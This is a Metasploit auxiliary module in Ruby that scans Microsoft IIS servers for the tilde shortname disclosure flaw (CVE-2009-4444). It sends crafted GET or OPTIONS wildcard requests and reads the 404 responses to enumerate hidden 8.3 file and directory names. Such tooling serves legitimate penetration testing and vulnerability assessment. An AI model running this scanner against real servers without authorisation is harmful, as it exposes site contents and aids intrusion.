##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Rex::Proto::Http

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Microsoft IIS shortname vulnerability scanner',
        'Description' => %q{
         The vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which
         could allow remote attackers to diclose 8.3 filenames (short names). In 2010, Soroush Dalili
	 and Ali Abbasnejad discovered the original bug (GET request). This was publicly disclosed in
         2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS.
        },
        'Author'         =>
          [
          'Soroush Dalili', # Vulnerability discovery
          'Ali Abbasnejad', # Vulnerability discovery
          'MinatoTW <shaks19jais[at]gmail.com>', # Metasploit module
          'egre55 <ianaustin[at]protonmail.com>' # Metasploit module
          ],
        'License'     => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', '2009-4444' ],
            [ 'URL', 'https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability/' ]
          ],
        'Targets' => [[ 'Automatic', {} ]]
      )
    )

  register_options([
          Opt::RPORT(80),
          OptString.new('PATH', [ true, "The base path to start scanning from", "/" ])

  ])
  @dirs = []
  @files = []
  @threads = []
  @queue = Queue.new
  @queue_ext = Queue.new
  @alpha = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\'()-@^_`{}'
  @found = Array.new
  @found2 = Array.new
  @found3 = Array.new
  @verb = ""
  end

  def check
    begin
      for method in ['GET', 'OPTIONS']
        res1 = send_request_cgi({
          'uri' => normalize_uri(datastore['PATH'], '*~1*'),
          'method' => method
        })

        res2 = send_request_cgi({
          'uri' => normalize_uri(datastore['PATH'],'QYKWO*~1*'),
          'method' => method
        })

        if res1.code == 404 && res2.code != 404
          vuln = 1
        end
      end
      if vuln == 1
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end

      rescue Rex::ConnectionError
        vprint_error("Connection failed")
        return Exploit::CheckCode::Unknown
    end
  end

  def is_vul
    for method in ['GET', 'OPTIONS']
      res1 = send_request_cgi({
        'uri' => normalize_uri(datastore['PATH'], '*~1*'),
        'method' => method
      })

      res2 = send_request_cgi({
        'uri' => normalize_uri(datastore['PATH'],'QYKWO*~1*'),
        'method' => method
      })

      if res1.code == 404 && res2.code != 404
        vuln = 1
        @verb = method
        break
      end
    end
    if vuln == 1
      return true
    else
      return false
    end
  rescue Rex::ConnectionError
    print_bad("Failed to connect to target")
  end

  def get_status(f , digit , match)
    res2 = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'],"#{f}#{match}~#{digit}#{match}"),
      'method' => @verb
    })
    return res2.code
  end

  def get_incomplete_status(url, match, digit , ext)
    res2 = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'],"#{url}#{match}~#{digit}.#{ext}*"),
      'method' => @verb
    })
    return res2.code
  end

  def get_complete_status(url, digit , ext)
    res2 = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'],"#{url}*~#{digit}.#{ext}"),
      'method' => @verb
    })
    return res2.code
  end

  def scanner
    while !@queue_ext.empty?
      f = @queue_ext.pop
      url = f.split(':')[0]
      ext = f.split(':')[1]
      status = get_incomplete_status(url, "*" , "1" , ext)
      if status == 404 && ext.size == 3
        @found3.each do |x|
          if get_complete_status(url, x , ext) == 404
            @files << "#{url}~#{x}.#{ext}"
          end
        end
      elsif status == 404 and ext.size < 4
        @found3.each do |x|
          if get_complete_status(url, x , ext) == 404
            @files << "#{url}~#{x}.#{ext}"
          end
        end
        for c in @found2
          @queue_ext << (f + c )
        end
      end
    end
  end

  def scan
    while !@queue.empty?
      url = @queue.pop
      status = get_status(url , "1" , "*")
      if url.size == 6 && status == 404
        @found3.each do |x|
          if get_status(url , x , "") == 404
            @dirs << "#{url}~#{x}"
          end
        end
        for ext in @found2
          @queue_ext << ( url + ':' + ext )
          @threads << Thread.new { scanner }
        end
      elsif status == 404
        @found3.each do |x|
          if get_complete_status(url, x , "") == 404
            @dirs << "#{url}~#{x}"
            break
          end
        end
        if get_incomplete_status(url, "" , "1" , "") == 404
          for ext in @found2
            @queue_ext << ( url + ':' + ext )
            @threads << Thread.new { scanner }
          end
        elsif url.size   < 6
          for c in @found
            @queue  <<(url +c)
          end
        end
      end
    end
  end

  def reduce
    for c in @alpha.chars
      res = send_request_cgi({
        'uri' => normalize_uri(datastore['PATH'],"*#{c}*~1*"),
        'method' => @verb
      })
      if res.code == 404
        @found << c
      end
    end
  end

  def ext
    for c in @alpha.chars
      res = send_request_cgi({
        'uri' => normalize_uri(datastore['PATH'],"*~1.*#{c}*"),
        'method' => @verb
      })
      if res.code == 404
        @found2 << c
      end
    end
  end

  def dup
    array = [*('1'..'9')]
    array.each do |c|
      res = send_request_cgi({
        'uri' => normalize_uri(datastore['PATH'],"*~#{c}.*"),
        'method' => @verb
      })
      if res.code == 404
        @found3 << c
      end
    end
  end

  def run
    unless is_vul
      print_status("Target is not vulnerable, or no shortname scannable files are present.")
      return
    end
      print_status("Scanning in progress...")
      @threads << Thread.new { reduce }
      @threads << Thread.new { dup }
      @threads << Thread.new { ext }
      @threads.each(&:join)

      for c in @found
        @queue << c
      end

      20.times {
        @threads << Thread.new { scan }
      }

      Rex.sleep(1) until @queue_ext.empty?

      @threads.each(&:join)

      proto = datastore['SSL'] ? 'https' : 'http'

      if @dirs.empty?
        print_status("No directories were found")
      else
        print_good("Found #{@dirs.size} directories")
        @dirs.each do |x|
          print_line("#{proto}://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
        end
      end

      if @files.empty?
        print_status("No files were found")
      else
        print_good("Found #{@files.size} files")
        @files.each do |x|
          print_line("#{proto}://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
        end
      end
    end
  end
